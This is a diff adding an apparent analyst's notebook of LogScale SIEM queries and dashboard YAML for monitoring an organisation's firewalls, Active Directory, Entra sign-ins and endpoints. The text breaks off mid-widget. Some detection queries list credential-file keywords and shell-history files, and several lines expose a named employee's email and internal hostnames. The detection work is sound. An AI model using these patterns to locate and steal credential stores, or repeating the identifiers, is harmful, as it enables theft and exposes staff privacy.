+        ntlm = /qld.bluecare.org.au/i   | replace(field=ntlm, regex="qld.bluecare.org.au", flags="i", with="bluecare");
+        *;
+    } 
+| select(fields=[domain, username, ntlm, displayname])
+
+```
+
+
+# nested join 
+```sh
+//| $ucq-repo-palofirewall()
+| readfile(file="ucq-fle-ad.csv") | email=~wildcard(?email, ignoreCase=true) | join({ readfile(file="ucq-fle-ad.csv") }, field=uid, include=ntusername, max=100)
+//| SourceUser = /adm_astein/i
+//| groupBy([SourceUser])
+
+```
+
+
+# working version
+```sh
+| $ucq-repo-palofirewall()
+| rename(field=SourceUser, as=ntusername)
+| join(
+    {   readfile(file="ucq-fle-ad.csv")
+        | format(format="%s,%s", field=[email, userPrincipalName], as=searchField)
+        | in(values=?email,field=searchField)
+        //| text:contains(string=searchField,substring=?email)
+        //| searchField=~wildcard(?email, ignoreCase=true)     // read in file and filter on email
+        | join(         // nested join back on itself on uid field
+            {   readfile(file="ucq-fle-ad.csv") 
+            }, field=uid, include=[sid,objectClass,name,samAccountName,description,userPrincipalName,manager,uid,email,type,ntusername,searchField], max=10) 
+    }, field=ntusername, include=[sid,objectClass,name,samAccountName,description,userPrincipalName,manager,uid,email,type,ntusername,searchField]
+)
+
+| groupby([ntusername, domain, sid, manager], function=[sum(BytesSent, as=totalBytesSent), sum(BytesReceived, as=totalBytesReceived)])
+
+//
+//| groupBy([SourceUser])
+```
+
+
+# age
+```sh
+groupBy(field=[#repo], function=[selectLast([(@timestamp)])])
+| age := now() - @timestamp
+| case{
+    #repo = "3pi_auto_raptor_1738630807520" | name:="on prem dhcp";
+    #repo = "3pi_auto_raptor_1738631587857" | name:="on prem netscaler";    
+    #repo = "3pi_auto_raptor_1738632052179" | name:="on prem ise";
+    #repo = "3pi_auto_raptor_1738632217780" | name:="on prem dns";
+    #repo = "3pi_auto_raptor_1738632865669" | name:="on prem palofirewall";
+    #repo = "3pi_auto_raptor_1738633381490" | name:="on prem active directory";
+    * | name:=#repo
+}
+// exclude 
+| !in(name, values=["xdr_eventsarchive", "sensor_backup", "3pi_connection_errors", "sensor_metadata" //, "xdr_indicatorsrepo", "base_sensor", "detections", "fcs_csp_events"
+    , "abnormal_security"       //abnormal may only send results if something is detected and that may not occur every hour
+])
+| test(age > (60000*60))        //last 60 minutes
+| formatDuration(field=age, as=age)
+| rename(age, as="TimeSinceSeen")
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="DateTime", field=@timestamp, timezone="Australia/Brisbane")
+| select([name, DateTime, TimeSinceSeen])
+
+```
+
+
+# working on get previous bucket counts
+```sh
+/* */
+
+$ucq-repo-palofirewall()
+| Type=GLOBALPROTECT
+| Status=failure
+| !in(PublicIP, values=[0.0.0.0])
+| ipLocation(field=PublicIP,as=location)
+| location.country!="AU"
+| bucket(span=6h, field=[PublicIP,location.country], function=([count(as="hitsThisBucket")]), limit=100)
+| hitsThisBucket > 10
+
+| join(
+    query={
+
+        $ucq-repo-palofirewall()
+        | Type=GLOBALPROTECT
+        | Status=failure
+        | ipLocation(field=PublicIP,as=location)
+        //| location.country!="AU"
+        | bucket(span=6h, field=PublicIP, function=([count()]), limit=100)
+        | _count > 10
+        | groupBy([PublicIP], function=[count(as="innerCount"),sum(_count, as="previousSum")]) 
+                
+//| _count < 1
+    }, field=[PublicIP], include=[PublicIP, innerCount, previousSum], start=24h)
+
+
+//| groupBy([PublicIP])
+
+
+
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="DateTime", field=_bucket, timezone="Australia/Brisbane")
+
+
+/* 
+$falcon/ngsiem-content:ngsiem_detections_base_search() | report_name = /ucq/i
+*/
+
+
+//[count(RemoteAddressIP4.country, distinct=true, as=CountryCount), collect([RemoteAddressIP4.country])]), limit=500)
+//| PublicIP != 0.0.0.0
+//| groupBy([PublicIP], function=[count(as=Count), count(field=SourceUser, as=SourceUserCount, distinct=true)])
+/* 
+groupBy(field=[#repo], function=[selectLast([(@timestamp)])])
+| age := now() - @timestamp
+//| test(age > (60000*60))        //last 60 minutes
+| formatDuration(field=age, as=age)
+| rename(age, as="TimeSinceSeen")
+| formatTime(format="%Y-%m-%e %H:%M:%S", as="DateTime", field=@timestamp, timezone="Australia/Brisbane")
+| select([name, DateTime, TimeSinceSeen])
+*/
+
+```
+
+
+
+# testing neighbor 
+```sh
+//get brute force attempts from globalprotect, outside AU and have > 500 hits in the last 6 hours
+$ucq-repo-palofirewall()
+| Type=GLOBALPROTECT
+| Status=failure
+| !in(PublicIP, values=[0.0.0.0])
+| ipLocation(field=PublicIP,as=location)
+| location.country!="AU"
+| bucket(span=6h, field=[PublicIP,location.country], function=([count(as="hitCount"), count(SourceUser, as="userCount")]), limit=500)
+| neighbor([hitCount,userCount], distance=1, prefix="prev")
+//if the current bucket hitCount doesnt break our limit, no point continuing
+| hitCount > 500
+//check if our logic would have created a previous by checking hitcount in the previous block
+| prev.hitCount < 500   
+//no we would not have raised a ticket, these are the ip addresses we should be blocking.
+| select([PublicIP, location.country, hitCount, prev.hitCount, userCount, prev.userCount])
+//lets raies a ticket in service now and assign to us. go go gadget workflow 
+
+```
+15:42
+"_bucket","PublicIP","location.country","hitCount","prev.hitCount"
+"1741737600000","94.102.49.29","NL","587","8"
+
+
+
+
+
+
+# enrich all
+```sh
+//$ucq-repo-crowdstrike() | UserName = /astein/i | matchOn:=UserSid       //  sid
+//$ucq-repo-crowdstrike() | matchOn:=DomainName       //  domain
+$ucq-repo-palofirewall() | domain=/-EXT-/i | splitString(by="@", field=SourceUser) | matchOn:=_splitstring[0]
+//| select(matchOn)
+
+
+| enrichType:= ?type        // build capability for more
+| case {
+    enrichType = /domain/i
+            //crowdstrike DomainName 
+        | ioc:lookup(field=[matchOn], type="domain", confidenceThreshold="unverified", prefix="_ioc", strict=false)
+        | match(file="ucq-fle-urls-livingOffTrustedSites.json", field=matchOn, column="url", strict=false)
+    ;
+    enrichType = /ipaddress|ip_address/i
+        | ioc:lookup(field=[matchOn], type=ip_address, prefix="_ioc", strict=false)
+        | match(file="ucq-fle-ips-rumbleSites.json", field=matchOn, column="subnet", mode="cidr", strict=false)
+    ;
+    enrichType = /url/i
+        | ioc:lookup(field=[matchOn], type=url)
+    ;
+
+    enrichType = /sid|ntusername/i |
+        case {
+            enrichType = /sid/i             | match(file="ucq-fle-ad-users.csv", field=matchOn, column=sid, strict=false, ignoreCase=true);
+            enrichType = /ntusername/i      | match(file="ucq-fle-ad-users.csv", field=matchOn, column=ntusername, strict=false, ignoreCase=true);
+            *;
+        }
+        | rename(field=description, as=_description)
+        | rename(field=email, as=_email)
+        | rename(field=manager, as=_manager)
+        | rename(field=ntusername, as=_ntusername)
+        | rename(field=objectclass, as=_objectclass)
+        | rename(field=samAccountName, as=_samAccountName)
+        | rename(field=sid, as=_sid)    
+        | rename(field=type, as=_type)
+        | rename(field=uid, as=_uid)
+        | rename(field=userPrincipalName, as=_userPrincipalName)
+    ;
+
+
+
+
+
+    enrichType = /applipedia/i
+        | match(file="ucq-fle-palofirewalls-applipedia.csv", field=matchOn, column=name, strict=false)
+    ;
+    *;
+}
+//| select([SourceUser, _sid])
+| groupBy([SourceUser, matchOn, _sid], function=[sum(BytesSent, as=totalBytesSent)])
+
+
+
+
+//| matchOn:=UserSid | match(file="ucq-fle-ad-users.csv", field=matchOn, column=sid, strict=false) 
+
+
+
+//| table([@timestamp, matchOn, enrichType, #event_simpleName, UserName,ComputerName, _email, _manager,_ntusername], limit=10000)
+
+
+//    enrichType = /sid/i
+//        | 
+
+
+
+```
+
+# ###########################################################################################
+# falcon enrich
+```
+| $falcon/helper:enrich(field=LogonType)
+```
+
+
+
+# timestamp
+
+```
+| #repo = 3pi_microsoft_entra_id
+| bucket(span=1d)
+| formatTime(format="%F %T", as="time", field=_bucket)
+| select([time, _count])
+```
+
+
+# percentage of total
+```sh
+
+$ucq-repo-abnormal()
+| attType := Vendor.messages.attackType
+| attType != /Spam/i
+//| vendor:=vendor
+| [count(attType, as="total"), groupBy([attType], function=count(attType, as="count"))]
+| percent := (count/total)*100 | format(format="%,.2f", field=[percent], as=percent)
+| rename(field=attType, as="attacktype")
+| drop(fields=[total])
+| sort(field="percent")
+| vendor:="abnormal"
+| select(fields=[vendor,attacktype,count,percent])  //percent if wanted
+
+
+abnormal    Phishing: Credential        439
+abnormal    Social Engineering (BEC)    34
+abnormal    Other                       28
+abnormal    Scam                        22
+abnormal    Malware                     18
+abnormal    Invoice/Payment Fraud (BEC) 2
+
+```
+
+
+# rohan activity in korea
+```sh
+$ucq-repo-entra()
+| Vendor.properties.userPrincipalName = "rohan.ferris@ucareqld.com.au"
+| host.os.name = ios
+| Vendor.properties.appDisplayName = *
+| Vendor.resultSignature = SUCCESS
+| Vendor.category = "SignInLogs"
+| select([
+    @timestamp,
+    Vendor.category,
+    Vendor.properties.appDisplayName,
+    Vendor.properties.riskDetail,
+    Vendor.properties.riskEventTypes[0],
+    Vendor.properties.riskLevelDuringSignIn,
+    Vendor.properties.location.city])
+
+```
+
+# palo split firewall name
+```sh
+| splitstring(field=domain, by="0", index=0, as=domain) | replace(field=domain, regex="-P", with="")
+```
+
+
+
+
+# entra successful authentication by country
+```sh
+$ucq-repo-entra()
+| Vendor.operationName = "Sign-in activity"
+| Vendor.resultSignature = SUCCESS
+| in("source.geo.country_name", values=[
+   "HK"        //hongkong
+  ,"IN"       //india
+  ,"NZ"       //newzealand
+  ,"PH"       //phillipines
+  ,"SG"       //singapore
+  ,"GB"       //uk
+  ,"US"       //land of the free
+  ,"KR"
+])
+// SUMMARY
+//| groupby(field=[source.geo.country_name, Vendor.properties.resourceDisplayName], function=[count(Vendor.properties.userPrincipalName, as=UniqueUserPrincipalNames)]) //, )
+// BREAKDOWN WITH UNIQUE USERS
+//| groupby(field=[source.geo.country_name, Vendor.properties.resourceDisplayName], function=[count(Vendor.properties.userPrincipalName, as=UniqueUserPrincipalNames), collect(Vendor.properties.userPrincipalName, separator=";")])
+// DONT CARE ABOUT APPS, JUST USERS
+| groupby(field=[Vendor.properties.userPrincipalName], function=[collect(source.geo.country_name, separator="; ")])
+
+```
+
+
+# firwalls dropbox traffic
+```sh
+
+$ucq-repo-palofirewall()
+| domain = /ext/i
+| Application = /dropbox-base/i
+| ApplicationSubCategory="file-sharing"
+| SourceUser=* and SourceUser != ""
+| !cidr(field=DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12 ","192.168.0.0/16"])      //exclude internal destinations
+| !in(field=Application, values=["sharefile-base","*onedrive-business*"])                   //sharefile-base and onedrive-business are approved
+| groupBy([SourceUser, Application], function=[sum(BytesSent, as=totalBytesSent)], limit=200000)
+| match(file="ucq-fle-ad-users.csv", column=ntusername, field=SourceUser)
+| unit:convert(totalBytesSent, as="totalMBytesSent", to="M") | format("%.2f", field=totalMBytesSent, as=totalMBytesSent)
+//| sort(TotalFileSizeMB, limit=10000)
+//| select([SourceUser, Application, totalMBytesSent]) | sort(totalMBytesSent)
+| select(fields=[SourceUser, Application, totalMBytesSent, email, name, manager])
+
+```
+
+
+
+# dhcp logs
+```sh
+$ucq-repo-dhcp()
+| 10.39.106.43
+| splitstring(field=@rawstring, as=fields, by=",")
+| record_id := fields[0]
+| date := fields[1]
+| time := fields[2]
+| message := fields[3]
+| ip_address := fields[4]
+| hostname := fields[5]
+| select(fields=[date, time, hostname,ip_address])
+
+```
+
+
+# palo join to dhcp logs
+```sh
+//contains SourceIP,hostname of dhcp registrations
+defineTable(query={
+        $ucq-repo-dhcp()
+        | splitstring(field=@rawstring, as=fields, by=",")
+        | record_id := fields[0]
+        | date := fields[1]
+        | time := fields[2]
+        | message := fields[3]
+        | SourceIP := fields[4]
+        | hostname := fields[5]
+        | length(hostname, as=lenhostname)
+        | lenhostname > 0
+        | groupBy(field=[SourceIP, hostname], limit=max)
+        | drop(fields=[_count])
+}, include=[SourceIP,hostname], name="dhcp", start=30d)
+
+// find all suspicious traffic over the firewalls where the source or destination ip address is flagged as HIGH maliciousnesss
+| $ucq-repo-palofirewall()
+| Action = allow
+| case {
+    //Inbound Traffic
+    cidr(DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fe80::/10", "169.254.0.0/16"])
+    | !cidr(SourceIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fe80::/10", "169.254.0.0/16"])
+    | direction := "Inbound"
+    ;    
+    //Outbound Traffic
+    !cidr(DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fe80::/10", "169.254.0.0/16"])
+    | cidr(SourceIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fe80::/10", "169.254.0.0/16"])
+    | direction := "Outbound"
+    ;
+    *
+}
+
+// ioc lookup confidence level is HIGH by default
+| ioc:lookup(field=[SourceIP], type="ip_address", include=["malicious_confidence", "labels"])
+| ioc:lookup(field=[DestinationIP], type="ip_address", include=["malicious_confidence", "labels"])
+| ioc.detected=true         //either sourceip or destinationip
+| splitstring(field=domain, by="0", index=0, as=domain) | replace(field=domain, regex="-P", with="")
+| splitstring(field="ioc[0].labels", by=",", as=labels)
+| select([@timestamp, SessionID, domain, direction, SourceIP, SourceZone, DestinationIP, DestinationZone, RuleName, BytesSent, BytesReceived, ioc[0].labels, "labels[0]"])
+| match(table=dhcp, field=SourceIP, column=SourceIP)
+| domain = /TWH-CORE-FW/i
+//| groupby(hostname, function=[sum(BytesSent, as=totalbytessent), sum(BytesReceived, as=totalbytesreceived)])
+
+
+```
+
+
+
+
+
+# dhcp logs
+```sh
+$ucq-repo-dhcp()
+| splitstring(field=@rawstring, as=fields, by=",")
+| record_id := fields[0]
+| date := fields[1]
+| time := fields[2]
+| message := fields[3]
+| SourceIP := fields[4]
+| hostname := fields[5]
+| macaddress := fields[6]
+| length(hostname, as=lenhostname)
+| lenhostname > 0
+| message = /assign/i
+
+```
+
+# dns logs
+```sh
+#repo=base_sensor 
+| #event_simpleName=DnsRequest 
+| groupby([DomainName])
+
+```
+
+
+
+# file open
+```
+$ucq-repo-crowdstrike()
+//| groupBy([#event_simpleName])
+| #event_simpleName = /FileOpenInfo/i
+| groupby([TargetFileName])
+
+```
+
+# changed password
+```
+$ucq-repo-crowdstrike()
+| #event_simpleName = /password/i
+//| groupBy([#event_simpleName])
+| groupBy([SamAccountName, #event_simpleName])
+
+```
+
+# entra and AD password change
+```
+/* 
+$ucq-repo-entra()
+| event.action = "change-user-password"
+| Vendor.properties.result = success
+| source.user.email != "Sync_UCQ-AADCON-P001_cb0ae5d5e4c8@ucq.onmicrosoft.com"    //exclude sync job
+//| groupBy([user.target.name])
+//| sort(field=_count, order=desc)
+//| _count > 1
+*/
+
+$ucq-repo-ad()
+| windows.EventID = 4723
+| windows.EventData.TargetUserName != "*$" and windows.EventData.SubjectUserName != "*$"
+| groupBy([windows.EventData.TargetDomainName, windows.EventData.TargetUserName])
+
+```
+
+
+
+# service accounts logging into servers
+```
+$ucq-repo-ad()
+| windows.EventID = 4624        //A user successfully logged on to a computer. For information about the type of logon
+| windows.EventData.TargetUserName = /svc_/i      // *svc*
+| windows.EventData.WorkstationName != "-"
+| groupBy([windows.EventData.TargetUserName], function=[
+  count(windows.EventData.WorkstationName, distinct=true),
+  collect(windows.EventData.WorkstationName)
+])
+| drop(_count)
+
+
+```
+
+
+
+# active directory password expiry enabled or disabled
+```
+$ucq-repo-ad()
+| windows.EventID = 5136                      //5136:   A directory service object was modified https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5136
+| windows.EventData.AttributeValue = 66048    //66048:  Password Doesn't Expire https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
+| case {
+    //https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
+    windows.EventData.OperationType = %%14674 | windows.EventData.OperationTypeString := "added"; // Value Added – new value added ('%%14674')
+    windows.EventData.OperationType = %%14675 | windows.EventData.OperationTypeString := "deleted"; // Value Deleted – value deleted ('%%14675', typically “Value Deleted” is a part of change operation).
+    * | windows.EventData.OperationTypeString = "unknown"; 
+}
+| groupBy([@timestamp, windows.EventData.DSName, windows.EventData.ObjectDN, windows.EventData.SubjectDomainName, windows.EventData.SubjectUserName, windows.EventData.OperationTypeString])
+| drop([_count])
+
+
+```
+
+
+
+
+# used csv file as config for centralised location for setting values
+
+```
+// ALERT
+$ucq-repo-crowdstrike()
+| #event_simpleName=/FileWritten$/ 
+| ((event_platform=Win DiskParentDeviceInstanceId="USB*") OR (event_platform=Mac IsOnRemovableDisk=1))
+| case {
+    match(file="ucq-fle-ad-groupusers.csv", field=UserName, column=Name, include=[group]) | authorised:=true | group:=group;
+    * | authorised:=false | group:="-"
+}
+| groupBy(field=[UserName, ComputerName, authorised, group, DistinguishedName],
+  function=(
+    [count(TargetFileName, as=FileCount) , 
+    sum(Size, as=SumSize), 
+    collect([TargetFileName])]
+  ))
+| unit:convert(SumSize, as="TotalFileSize", to="M") | format("%.2f", field=TotalFileSize, as=TotalFileSizeMB)
+// CHECK AGAINST VALUE IN CSV FILE 
+| drop(TargetFileName) //so much data, dropping
+| key:="usbTotalMBExfil" | match(file="ucq-fle-test-adamconfig.csv", field=key, include=[value])
+| test(TotalFileSizeMB >= value)
+```
+
+
+
+# ad parser with explainations for domain controller
+
+
+```yaml
+
+sources:
+  # Windows event logs
+  windows_events:
+    type: wineventlog
+    channels:
+      - name: Application
+        onlyEventIDs:
+          - 1518  # User Profile Service failed to load user profile
+          - 1511  # User Profile Service failed to find user profile (temporary profile loaded)
+          - 1000  # Application Error (application crash)
+          - 1001  # Windows Error Reporting (application crash report generated)
+          - 1002  # Application Hang (application stopped responding)
+          - 95    # SideBySide error (assembly / runtime dependency issue)
+          - 1022  # .NET Runtime error
+          - 1033  # MsiInstaller – Windows Installer installation success
+            # ai suggested
+          - 11707  # Application installation successful (MsiInstaller)
+          - 11724  # Application removal successful
+          - 10005  # DCOM permission error
+          - 10010  # DCOM timeout
+      - name: Security
+        excludeEventIDs:
+          - 4689  # Process terminated
+          - 4688  # Process created
+          - 5156  # Windows Filtering Platform allowed a connection
+          - 5158  # Windows Filtering Platform permitted bind to local port
+          - 5446  # Windows Filtering Platform filter changed
+          - 5447  # Windows Filtering Platform filter changed (policy update)
+          - 4658  # Handle to an object closed
+          - 5058  # Cryptographic operation
+          - 5061  # Cryptographic operation
+          - 600   # Kerberos authentication (domain controller related)
+          - 4656  # Handle to an object requested
+          - 4661  # Handle to an object requested (directory service)
+      - name: System
+        onlyEventIDs:
+          - 7022  # Service hung on startup
+          - 7023  # Service terminated with error
+          - 7024  # Service terminated with service-specific error
+          - 7026  # Boot-start or system-start driver failed to load
+          - 7031  # Service terminated unexpectedly
+          - 7032  # Service recovery action taken
+          - 7034  # Service terminated unexpectedly (no recovery action)
+          - 6     # Driver loaded into kernel
+          - 7045  # New service installed
+          - 7000  # Service failed to start
+          - 19    # Windows Update installation successful
+          - 1     # System sleep/hibernate transition (Power-Troubleshooter)
+          - 13    # Registry value set (system change)
+          - 12    # Operating system started (system boot)
+          # ai suggested below
+          - 41    # System rebooted unexpectedly (Kernel-Power)
+          - 6005  # Event log service started (system startup)
+          - 6006  # Event log service stopped (clean shutdown)
+          - 6008  # Unexpected shutdown
+          - 1074  # System shutdown/restart initiated (who triggered it)
+          - 7040  # Service start type changed (Auto → Disabled, etc.)
+          - 4698  # Scheduled task created
+          - 4699  # Scheduled task deleted
+    includeXML: false
+    sink: logscale
+
+```
+
+
+## dashboard yaml testing
+
+```yaml
+
+
+name: ucq-dsh-testing
+updateFrequency: never
+timeSelector: {}
+sharedTimeInterval:
+  enabled: false
+  isLive: false
+  start: 1d
+widgets:
+  26a6766a-4b33-46a9-a9ba-918fa0a7390e:
+    x: 8
+    y: 0
+    height: 4
+    queryString: |-
+      $ucq-repo-crowdstrike()
+      | /ConsoleHost_history.txt|powershell history|bash_history/i
+      | join({#event_simpleName=UserLogon}, field=aid, include=UserName, mode=left)
+      | groupby(field=[TargetFileName, ComputerName, UserName])
+    end: now
+    start: 1d
+    width: 4
+    options:
+      columns:
+      - fieldName: '@timestamp'
+        format: datetime
+        type: field
+        width: 200
+      - groupByPrefix: false
+        header: Field List
+        type: fieldList
+      newestAtBottom: true
+      showOnlyFirstLine: false
+    visualization: list-view
+    title: wip console history
+    isLive: false
+    type: query
+  4e9bed56-bd7d-44b9-80ee-bd48a5f3126c:
+    x: 0
+    y: 4
+    height: 4
+    queryString: |-
+      $ucq-repo-crowdstrike()
+      | Technique="Network Sniffing"
+      | groupBy([ComputerName, UserName, TargetImageFileName])
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip network sniffing
+    isLive: false
+    type: query
+  7595ebd8-dd24-4fe5-8241-0434e7c10b11:
+    x: 4
+    y: 8
+    height: 4
+    queryString: |-
+      $ucq-repo-crowdstrike()
+      | CommandLine = /c:\\Windows\\system32\\drivers\\etc\\hosts/i
+      | groupBy([@timestamp, ComputerName, UserName, CommandLine])
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip hosts file
+    isLive: false
+    type: query
+  d8f9d3e5-7cdd-427f-80a0-19b4cedea31d:
+    x: 4
+    y: 4
+    height: 4
+    queryString: |-
+      $ucq-repo-crowdstrike()
+      | #event_simpleName=ProcessRollup2
+      | in(field=CommandLine, values=["*password.*", "*passwords.*", "*credential.*", "*creds.*", "*pwds.*", "*pws.*", "*haslo.*", "*hasla.*", "*credentials.*"], ignoreCase=true)
+      | in(field=CommandLine, values=["*WINWORD.EXE*", "*EXCEL.EXE*",  "*NOTEPAD.EXE*", "*KEEPASS.EXE*"], ignoreCase=true)
+      | groupBy(field=[ComputerName, UserName, CommandLine, @timestamp, aip])
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip password stores
+    isLive: false
+    type: query
+  0c23ddde-aac1-48ff-b74d-4ed7f060e48e:
+    x: 4
+    y: 0
+    height: 4
+    queryString: |-
+      $ucq-repo-crowdstrike()
+      | #event_simpleName=EmailFileWritten
+      | UserName = *
+      | groupBy(field=[UserName, LocalAddressIP4, ComputerName], function=[count(as=Count)])
+      | sort(Count, order=desc, limit=10000)
+      | Count > 10
+    end: now
+    start: 1d
+    width: 4
+    options:
+      columns:
+      - fieldName: '@timestamp'
+        format: datetime
+        type: field
+        width: 200
+      - groupByPrefix: false
+        header: Field List
+        type: fieldList
+      newestAtBottom: true
+      showOnlyFirstLine: false
+    visualization: list-view
+    title: wip email collection
+    isLive: false
+    type: query
+  a0ff103e-4c4e-4e5c-905a-77e5db8d8f6c:
+    x: 8
+    y: 8
+    height: 4
+    queryString: |+
+      $ucq-repo-crowdstrike()
+      | #event_simpleName=/ScheduledTask*/i
+      | concat([TaskName, TaskExecCommand, TaskExecArguments], as=TaskCommand)
+
+      /* exclusions */
+      | TaskExecCommand = *
+      | UserName != "*$"          // local service account
+      | TaskCommand != /User_Feed_Synchronization-{[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}}C:\\Windows\\system32\\msfeedssync.exesync/i
+      | TaskCommand != /Microsoft\\Windows\\InstallService\\SmartRetry/i
+      | TaskCommand != /Microsoft\\Windows\\EnterpriseMgmtNonCritical\\[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}\\Queued Schedule created for queued alerts%windir%\\system32\\deviceenroller.exe\/o "[0-9A-Fa-f]{8}(?:-[0-9A-Fa-f]{4}){3}-[0-9A-Fa-f]{12}" \/c \/[q|y]/i
+      | TaskCommand != /Microsoft\\Windows\\GroupPolicy\\{[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}}gpupdate.exe \/target:computer/i
+      | TaskCommand != /Microsoft\\Windows\\EnterpriseMgmt\\[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\\PushRenewal%windir%\\system32\\deviceenroller.exe\/o "[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}" \/c \/y/i
+      | TaskCommand != /OneDrive Reporting Task-S-1-[0-59]-\d{2}-\d{8,10}-\d{8,10}-\d{8,10}-[1-9]\d{4}C:\\Program Files\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\/reporting/i
+      | TaskCommand != /OneDrive Reporting Task-S-1-[0-59]-\d{2}-\d{8,10}-\d{8,10}-\d{8,10}-[1-9]\d{5}c:\\Program Files \(x86\)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\/reporting/i
+      | TaskCommand != /OneDrive Reporting Task-S-1-[0-59]-\d{2}-\d{8,10}-\d{8,10}-\d{8,10}-[1-9]\d{4}c:\\Program Files \(x86\)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\/reporting/i
+      | TaskCommand != /OneDrive Reporting Task-S-1-[0-59]-\d{2}-\d{8,10}-\d{8,10}-\d{8,10}-[1-9]\d{5}c:\\Program Files\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\/reporting/i
+      | TaskCommand != /Microsoft\\Windows\\UpdateOrchestrator\\Schedule Work%systemroot%\\system32\\usoclient.exeStartWork/i
+      | TaskCommand != /Microsoft\\Windows\\UpdateOrchestrator\\Schedule Wake To Work%systemroot%\\system32\\usoclient.exeStartWork/i
+      | TaskCommand != /Microsoft\\Windows\\UpdateOrchestrator\\Schedule Maintenance Work%systemroot%\\system32\\usoclient.exeStartMaintenanceWork/i
+      | TaskCommand != /Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan%systemroot%\\system32\\usoclient.exeStartScan/i
+      | TaskCommand != /Launch Adobe CCXProcess"C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\CCXProcess.exe"/i
+      | TaskCommand != /Microsoft\\Windows\\RetailDemo\\CleanupOfflineContent/i
+      | TaskCommand != /Microsoft\\Windows\\CertificateServicesClient\\KeyPreGenTask/i
+      | TaskCommand != /OneDrive Reporting Task-S-1-12-1-3084567264-1221112154-3754773674-2220494791C:\\Program Files \(x86\)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\/reporting/i
+      | TaskCommand != /Optimize Start Menu Cache Files-S-1-[0-59]-\d{2}-\d{8,10}-\d{8,10}-\d{8,10}-[1-9]\d{3,5}/i
+      | TaskCommand != /GoogleSystem\\GoogleUpdater\\GoogleUpdaterTaskSystem129.0.6651.0{[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}}"C:\\Program Files \(x86\)\\Google\\GoogleUpdater\\129.0.6651.0\\updater.exe"--wake --system/i
+      | TaskCommand != /Microsoft\\Windows\\SysReset(ErrRefresh|LogFailure)/i
+      | TaskCommand != /Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan Static Task%systemroot%\\system32\\usoclient.exeStartScan/i
+      | TaskCommand != /Microsoft\\VisualStudio\\Updates\\BackgroundDownloadC:\\Program Files \(x86\)\\Microsoft Visual Studio\\Installer\\resources\\app\\ServiceHub\\Services\\Microsoft.VisualStudio.Setup.Service\\BackgroundDownload.exe/i
+      | TaskCommand != /Microsoft\\Windows\\EnterpriseMgmt\\[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\\Sync Status Poll%windir%\\system32\\deviceenroller.exe\/c \/StatusPageTracking \/o [0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}/i
+      | TaskCommand != /Microsoft\\Windows\\RestartManager\\{[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}}C:\\Windows\\system32\\rmclient.exe\\\\.\\pipe\\RestartManager-{[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}}/i
+      | TaskCommand != /Microsoft\\Windows\\WindowsUpdate\\Scheduled StartC:\\WINDOWS\\system32\\sc.exestart wuauserv/i
+
+      //crowdstrike
+      | TaskCommand != /Deploy Crowdstrike Falcon for Windowspowershell.exe-ExecutionPolicy Bypass -File "\\\\BC-MSPMD2-P004.qld.bluecare.org.au\\Polycom\\CS_Deploy\\Install-CrowdStrike.ps1"/i
+      | TaskCommand != /Deploy Crowdstrike Falcon for Windowspowershell.exe-ExecutionPolicy Bypass -File "\\\\UCC-MSPMD1-P001.lccq.org.au\\Polycom\\CS_Deploy\\Install-CrowdStrike.ps1"/i
+      | TaskCommand != /Deploy Crowdstrike Falcon for Windowspowershell.exe-ExecutionPolicy Bypass -File "\\\\UCH-MSPMD1-P001.uhc.uc.com.au\\Polycom\\CS_Deploy\\Install-CrowdStrike.ps1"/i
+      | TaskCommand != /Deploy Crowdstrike Falcon for Windowspowershell.exe-ExecutionPolicy Bypass -File "\\\\ucq-mspmd1-p001.int.ucq.com.au\\Polycom\\CS_Deploy\\Install-CrowdStrike.ps1"/i
+      //| groupby(TaskCommand) | sort(_count)
+
+      | rename(#event_simpleName, as=SimpleName)
+      | groupBy([SimpleName, UserName, ComputerName, TaskName, TaskExecCommand, TaskCommand])
+      | sort(_count,order=desc, limit=10000)
+
+    end: now
+    start: 1d
+    width: 4
+    options:
+      cell-overflow: wrap-text
+      configured-columns: {}
+      row-numbers-enabled: false
+    visualization: table-view
+    title: wip - scheduled tasks
+    isLive: false
+    type: query
+  20f327ea-5598-4b2e-b746-c5ba6a3d3fc7:
+    x: 0
+    y: 8
+    height: 4
+    queryString: |-
